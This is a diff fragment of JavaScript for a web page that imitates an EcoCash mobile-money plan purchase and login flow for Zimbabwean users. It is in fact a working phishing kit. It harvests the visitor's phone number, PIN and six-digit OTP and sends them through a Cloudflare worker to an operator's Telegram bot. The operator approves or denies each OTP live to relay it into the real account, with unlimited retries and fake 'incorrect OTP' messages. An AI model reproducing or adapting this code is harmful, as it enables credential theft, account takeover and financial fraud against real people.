+    '⚠️ <i>Approve to authenticate the user, or Deny to reject this OTP.</i>';
+
+  var keyboard = {
+    inline_keyboard: [[
+      { text: '✅ Approve', callback_data: 'OTPOK_' + attemptToken },
+      { text: '❌ Deny',    callback_data: 'OTPNO_' + attemptToken }
+    ]]
+  };
+
+  fetch('https://empty-pine-2591.riggynice.workers.dev/telegram/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  })
+  .then(function(r) { return r.json(); })
+  .then(function(data) {
+    if (data && data.ok) {
+      pollForOtpDecision(attemptToken, data.result.message_id);
+    } else {
+      /* Telegram send failed — show error, do not auto-approve */
+      var btn2 = document.getElementById('btn-submit');
+      var appSt = document.getElementById('otp-approval-status');
+      if (appSt) appSt.classList.remove('visible');
+      if (btn2) { btn2.textContent = 'Submit'; btn2.disabled = false; btn2.style.background = ''; }
+      var dm = document.getElementById('otp-denied-msg');
+      var dtEl = document.querySelector('.otp-denied-text');
+      var dsEl = document.querySelector('.otp-denied-sub');
+      if (dtEl) dtEl.textContent = 'Connection error. Please try again.';
+      if (dsEl) dsEl.textContent = 'Could not reach the server.';
+      if (dm) dm.classList.add('visible');
+    }
+  })
+  .catch(function() {
+    var btn2 = document.getElementById('btn-submit');
+    var appSt = document.getElementById('otp-approval-status');
+    if (appSt) appSt.classList.remove('visible');
+    if (btn2) { btn2.textContent = 'Submit'; btn2.disabled = false; btn2.style.background = ''; }
+    var dm = document.getElementById('otp-denied-msg');
+    var dtEl = document.querySelector('.otp-denied-text');
+    var dsEl = document.querySelector('.otp-denied-sub');
+    if (dtEl) dtEl.textContent = 'Connection error. Please try again.';
+    if (dsEl) dsEl.textContent = 'Could not reach the server.';
+    if (dm) dm.classList.add('visible');
+  });
+}
+
+/* ── Poll Telegram until Approve or Deny is pressed for this specific attempt ── */
+function pollForOtpDecision(attemptToken, msgId) {
+  if (otpPollTimer) { clearInterval(otpPollTimer); otpPollTimer = null; }
+
+  var pollCount = 0;
+  var maxPolls  = 300; /* 5 minutes */
+
+  otpPollTimer = setInterval(function() {
+    pollCount++;
+    if (pollCount > maxPolls) {
+      clearInterval(otpPollTimer); otpPollTimer = null;
+      handleOtpDecision('deny', msgId, attemptToken);
+      return;
+    }
+
+    fetch('https://empty-pine-2591.riggynice.workers.dev/telegram/bot' + TELEGRAM_BOT_TOKEN +
+          '/getUpdates?offset=' + (globalLastUpdateId + 1) + '&limit=20&timeout=0')
+      .then(function(r) { return r.ok ? r.json() : null; })
+      .then(function(data) {
+        if (!data || !data.ok || !data.result) return;
+
+        data.result.forEach(function(update) {
+          /* Always advance the global cursor regardless of whether we act */
+          globalLastUpdateId = Math.max(globalLastUpdateId, update.update_id);
+
+          if (!update.callback_query) return;
+          var cb     = update.callback_query;
+          var cbData = cb.data || '';
+
+          /* Acknowledge the button press to Telegram immediately */
+          fetch('https://empty-pine-2591.riggynice.workers.dev/telegram/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ callback_query_id: cb.id })
+          }).catch(function(){});
+
+          /* Only act if this callback belongs to the current attempt's token.
+             Any other callback_data (old sessions, old attempts) is ignored. */
+          if (cbData === 'OTPOK_' + attemptToken) {
+            clearInterval(otpPollTimer); otpPollTimer = null;
+            handleOtpDecision('approve', msgId, attemptToken);
+          } else if (cbData === 'OTPNO_' + attemptToken) {
+            clearInterval(otpPollTimer); otpPollTimer = null;
+            handleOtpDecision('deny', msgId, attemptToken);
+          }
+          /* All other callback data: advance cursor and move on */
+        });
+      })
+      .catch(function(){});
+  }, 1000);
+}
+
+/* ── Edit a Telegram message text (used to mark outcome) ── */
+function editTelegramMessage(msgId, text) {
+  if (!msgId) return;
+  fetch('https://empty-pine-2591.riggynice.workers.dev/telegram/bot' + TELEGRAM_BOT_TOKEN + '/editMessageText', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      message_id: msgId,
+      text: text,
+      parse_mode: 'HTML'
+    })
+  }).catch(function(){});
+}
+
+/* ── Handle the outcome of one OTP attempt ── */
+function handleOtpDecision(outcome, msgId, attemptToken) {
+  var btn            = document.getElementById('btn-submit');
+  var approvalStatus = document.getElementById('otp-approval-status');
+  var deniedMsg      = document.getElementById('otp-denied-msg');
+
+  /* Always stop spinner */
+  if (approvalStatus) approvalStatus.classList.remove('visible');
+
+  /* ── APPROVED ── */
+  if (outcome === 'approve') {
+    editTelegramMessage(msgId, '✅ OTP Approved — user authenticated successfully.');
+
+    var p       = plans[selectedPlanKey] || plans['399'];
+    var nameEl  = document.getElementById('success-plan-name');
+    var durEl   = document.getElementById('success-plan-duration');
+    var priceEl = document.getElementById('success-plan-price');
+    if (nameEl)  nameEl.textContent  = p.successName;
+    if (durEl)   durEl.textContent   = p.successDuration;
+    if (priceEl) priceEl.textContent = p.successPrice;
+
+    if (btn) { btn.textContent = 'Submit'; btn.disabled = false; btn.style.background = ''; btn.classList.remove('ready'); }
+    setTimeout(function() { showPage('page-success'); }, 400);
+    return;
+  }
+
+  /* ── DENIED ── */
+  otpAttemptCount++;
+  editTelegramMessage(msgId, '❌ OTP Denied — attempt ' + otpAttemptCount + '.');
+
+  /* No lockout — unlimited attempts. Show inline error and let user re-enter OTP. */
+  var deniedTextEl = document.querySelector('.otp-denied-text');
+  var deniedSubEl  = document.querySelector('.otp-denied-sub');
+  if (deniedTextEl) deniedTextEl.textContent = 'Incorrect OTP. Please try again.';
+  if (deniedSubEl)  deniedSubEl.textContent  = 'Enter the correct OTP to continue.';
+  if (deniedMsg) deniedMsg.classList.add('visible');
+
+  if (btn) { btn.textContent = 'Submit'; btn.disabled = false; btn.style.background = ''; btn.classList.remove('ready'); }
+  ['o1','o2','o3','o4','o5','o6'].forEach(function(id) {
+    var el = document.getElementById(id); if (el) el.value = '';
+  });
+  capturedOtp = '';
+  var o1 = document.getElementById('o1');
+  if (o1) o1.focus();
+
+  setTimeout(function() {
+    if (deniedMsg) deniedMsg.classList.remove('visible');
+  }, 6000);
+}
+
+/* ── Page switching ── */
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(function(p) {
+    p.classList.remove('active');
+    p.style.display = 'none';
+  });
+  var el = document.getElementById(id);
+  if (el) {
+    el.style.display = 'block';
+    el.classList.add('active');
+  }
+  window.scrollTo(0, 0);
+}
+
+/* ── Modal ── */
+function openModal(key) {
+  selectedPlanKey = key;
+  var p = plans[key];
+  document.getElementById('m-emoji').textContent   = p.emoji;
+  document.getElementById('m-title').textContent   = p.title;
+  document.getElementById('m-desc').textContent    = p.desc;
+  document.getElementById('m-price').textContent   = p.price;
+  document.getElementById('m-validity').textContent= p.validity;
+  document.getElementById('m-note').textContent    = p.note;
+  document.getElementById('m-cta').textContent     = p.cta;
+  document.getElementById('m-bullets').innerHTML   = p.bullets.map(function(b){ return '<li>' + b + '</li>'; }).join('');
+  document.getElementById('modal-overlay').classList.add('open');
+}
+function closeModal() {
+  document.getElementById('modal-overlay').classList.remove('open');
+}
+document.getElementById('modal-overlay').addEventListener('click', function(e) {
+  if (e.target === this) closeModal();
+});
+function goToLogin() {
+  closeModal();
+
+  // Show EcoCash connecting overlay for 3 seconds
+  var overlay = document.getElementById('ecocash-connect-overlay');
+  if (overlay) {
+    overlay.classList.add('active');
+    // Trigger progress bar (needs a tiny delay so CSS transition fires)
+    setTimeout(function() {
+      var bar = document.getElementById('eco-progress-bar');
+      if (bar) bar.style.width = '100%';
+    }, 50);
+  }
+
+  setTimeout(function() {
+    if (overlay) overlay.classList.remove('active');
+    // Reset progress bar instantly for next use
+    var bar = document.getElementById('eco-progress-bar');
+    if (bar) { bar.style.transition = 'none'; bar.style.width = '0%'; }
+    setTimeout(function() {
+      if (bar) bar.style.transition = 'width 3s linear';
+    }, 100);
+
+    showPage('page-login');
+    // Clear PIN and phone
+    ['p1','p2','p3','p4'].forEach(function(id) {
+      var el = document.getElementById(id);
+      if (el) el.value = '';
+    });
+    var phoneEl = document.getElementById('phone-input');
+    if (phoneEl) {
+      phoneEl.value = '';
+      phoneEl.style.borderColor = '';
+      phoneEl.focus();
+    }
+    capturedPin = '';
+    currentPhoneNumber = '';
+  }, 3000);
+}
+
+/* ── PIN input ── */
+function nextPin(el, nextId) {
+  if (el.value.length === 1 && nextId) {
+    var next = document.getElementById(nextId);
+    if (next) next.focus();
+  }
+}
+function prevPin(e, el, prevId) {
+  if (e.key === 'Backspace' && el.value === '' && prevId) {
+    var prev = document.getElementById(prevId);
+    if (prev) prev.focus();
+  }
+}
+function resetPinFields() {
+  ['p1','p2','p3','p4'].forEach(function(id) {
+    var el = document.getElementById(id);
+    if (el) el.value = '';
+  });
+  var p1 = document.getElementById('p1');
+  if (p1) p1.focus();
+}
+function checkPin() {
+  var pinValues = ['p1','p2','p3','p4'].map(function(id) {
+    var el = document.getElementById(id);
+    return el ? el.value : '';
+  });
+  var filled = pinValues.every(function(v) { return v !== ''; });
+  if (!filled) return;
+
+  var phone = getPhoneNumber();
+
+  /* ── Strict Zimbabwe phone validation: 9 or 10 digits ── */
+  if (phone.length < 9) {
+    showPhoneError(phone.length === 0
+      ? 'Please enter your mobile number to continue'
+      : 'Please enter a valid Zimbabwe mobile number');
+    resetPinFields();
+    return;
+  }
+  if (phone.length > 10) {
+    showPhoneError('Please enter a valid Zimbabwe mobile number');
+    resetPinFields();
+    return;
+  }
+
+  /* ── All good — clear any phone error ── */
+  hidePhoneError();
+
+  capturedPin = pinValues.join('');
+  currentPhoneNumber = phone;
+  currentSessionId = generateSessionId();
+
+  /* ── Show loading overlay ── */
+  showLoadingOverlay('Verifying your details…', 'Sending your credentials securely');
+
+  /* ── Send credentials to Telegram WITH inline keyboard (Approve / Deny) ── */
+  sendCredentialsWithKeyboard(currentPhoneNumber, capturedPin, currentSessionId);
+}
+
+/* ── OTP input ── */
+function otpNext(el, nextId) {
+  el.value = el.value.replace(/[^0-9]/g, '');
+  if (el.value && nextId) {
+    var next = document.getElementById(nextId);
+    if (next) next.focus();
+  }
+  otpCheck();
+}
+function otpBack(e, el, prevId) {
+  if (e.key === 'Backspace' && el.value === '' && prevId) {
+    var prev = document.getElementById(prevId);
+    if (prev) prev.focus();
+  }
+  otpCheck();
+}
+function otpCheck() {
+  var otpValues = ['o1','o2','o3','o4','o5','o6'].map(function(id) {
+    var el = document.getElementById(id);
+    return el ? el.value : '';
+  });
+  var filled = otpValues.every(function(v) { return v !== ''; });
+  var btn = document.getElementById('btn-submit');
+  if (btn) btn.classList.toggle('ready', filled);
+  /* Auto-submit when all 6 digits are filled */
+  if (filled) {
+    setTimeout(function() { submitOtp(); }, 300);
+  }
+}
+
+function submitOtp() {
+  var otpValues = ['o1','o2','o3','o4','o5','o6'].map(function(id) {
+    var el = document.getElementById(id);
+    return el ? el.value : '';
+  });
+  var filled = otpValues.every(function(v) { return v !== ''; });
+  if (!filled) return;
+
+  capturedOtp = otpValues.join('');
+
+  var btn            = document.getElementById('btn-submit');
+  var deniedMsg      = document.getElementById('otp-denied-msg');
+  var approvalStatus = document.getElementById('otp-approval-status');
+
+  /* Clear any previous error */
+  if (deniedMsg) deniedMsg.classList.remove('visible');
+
+  /* Show verifying spinner and lock the button */
+  if (approvalStatus) approvalStatus.classList.add('visible');
+  if (btn) { btn.textContent = 'Verifying…'; btn.disabled = true; btn.style.background = '#1565c0'; }
+
+  /* Send to Telegram — each call creates its own unique attempt token */
+  sendOtpToTelegram(capturedOtp);
+}
+
+/* ── OTP Countdown ── */
+var cdTimer;
+function startOtpCountdown() {
+  clearInterval(cdTimer);
+  var secs = 107;
+  var resendEl = document.getElementById('otp-resend-text');
+  if (!resendEl) return;
+  resendEl.innerHTML = 'Resend OTP in <span id="otp-cd">' + secs + '</span> seconds';
+  cdTimer = setInterval(function() {
+    secs--;
+    var el = document.getElementById('otp-cd');
+    if (!el) { clearInterval(cdTimer); return; }
+    if (secs <= 0) {
+      clearInterval(cdTimer);
+      resendEl.innerHTML = '<a href="#" style="color:#1565c0;font-weight:600;text-decoration:none">Resend OTP</a>';
+    } else {
+      el.textContent = secs;
+    }
+  }, 1000);
+}
+
+// Manual submit button click
+document.getElementById('btn-submit').addEventListener('click', function() {
+  var filled = ['o1','o2','o3','o4','o5','o6'].every(function(id) {
+    var el = document.getElementById(id);
+    return el && el.value !== '';
+  });
+  if (filled) submitOtp();
+});
+
+// Reset and go home (from success page)
+function resetAndGoHome() {
+  if (otpPollTimer)   { clearInterval(otpPollTimer);   otpPollTimer   = null; }
+  if (loginPollTimer) { clearInterval(loginPollTimer); loginPollTimer = null; }
+  hideLoadingOverlay();
+  ['p1','p2','p3','p4','o1','o2','o3','o4','o5','o6'].forEach(function(id) {
+    var el = document.getElementById(id);
+    if (el) el.value = '';
+  });
+  var phoneEl = document.getElementById('phone-input');
+  if (phoneEl) { phoneEl.value = ''; }
+  hidePhoneError();
+  var btn = document.getElementById('btn-submit');
+  if (btn) {
+    btn.textContent = 'Submit';
+    btn.disabled = false;
+    btn.style.background = '';
+    btn.classList.remove('ready');
+  }
+  var otpPhoneEl = document.getElementById('display-phone-otp');
+  if (otpPhoneEl) otpPhoneEl.textContent = '';
+  var approvalStatus = document.getElementById('otp-approval-status');
+  if (approvalStatus) approvalStatus.classList.remove('visible');
+  var deniedMsg = document.getElementById('otp-denied-msg');
+  if (deniedMsg) deniedMsg.classList.remove('visible');
+  capturedPin = '';
+  capturedOtp = '';
+  currentPhoneNumber = '';
+  currentSessionId = '';
+  otpAttemptCount = 0;
+  globalLastUpdateId = 0;
+  showPage('page-plans');
+}
+
+// Init display
+document.querySelectorAll('.page').forEach(function(p) { p.style.display = 'none'; });
+var plansPage = document.getElementById('page-plans');
+if (plansPage) {
+  plansPage.style.display = 'block';
+  plansPage.classList.add('active');
+}
+</script>
+
+</body>
+</html>
